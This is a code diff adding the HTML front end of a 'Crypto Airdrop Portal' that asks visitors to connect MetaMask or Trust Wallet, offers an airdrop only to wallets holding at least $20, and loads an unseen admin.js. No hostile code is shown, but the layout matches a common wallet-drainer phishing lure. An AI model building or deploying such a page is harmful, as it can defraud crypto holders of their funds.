@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Airdrop Portal</title>
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.1/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <header>
+    <h1>🎉 Welcome to Crypto Airdrop Portal</h1>
+    <p>Airdrop to verified wallets with balance ≥ $20</p>
+  </header>
+
+  <main>
+    <section>
+      <label for="walletType">Select Wallet Type:</label>
+      <select id="walletType">
+        <option value="metamask">MetaMask</option>
+        <option value="trustwallet">Trust Wallet</option>
+      </select>
+      <button id="connectBtn">Connect Wallet</button>
+      <div id="walletInfo">Wallet: Not Connected</div>
+      <div id="balanceInfo">Balance: --</div>
+      <p id="eligibilityMessage"></p>
+    </section>
+
+    <section>
+      <label for="manualAddress">Or enter a wallet address manually:</label><br />
+      <input type="text" id="manualAddress" placeholder="0x..." />
+      <span id="validationStatus">⏳</span>
+    </section>
+
+    <section>
+      <label for="assetSelect">Select Airdrop Asset:</label>
+      <select id="assetSelect">
+        <option value="ETH">Ethereum</option>
+        <option value="USDT">Tether</option>
+        <option value="BNB">Binance Coin</option>
+        <option value="SOL">Solana</option>
+      </select>
+    </section>
+
+    <button id="claimBtn" disabled>Claim Airdrop</button>
+  </main>
+
+  <footer>
+    Courtesy Seasonal Airdrop 2025
+  </footer>
+
+  <script src="admin.js"></script>
+</body>
+</html>
